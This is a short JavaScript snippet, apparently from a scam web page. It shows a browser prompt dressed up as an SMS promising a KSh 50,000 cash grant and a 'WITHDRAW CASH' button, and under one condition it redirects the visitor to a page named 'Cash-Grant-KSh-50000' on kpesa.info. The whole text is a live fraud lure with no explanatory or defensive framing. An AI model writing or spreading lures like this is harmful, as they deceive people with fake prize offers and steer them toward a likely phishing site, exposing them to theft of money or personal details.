var password = 'WITHDRAW CASH'
password = prompt(
  'SMS: Congratulations! You are eligible to receive KSh 50,000. Please press OK to WITHDRAW.',
  'WITHDRAW CASH'
);
if (password != 'WITHDRAW CASH') {
  location.href = 'https://kpesa.info/Cash-Grant-KSh-50000.html';
}
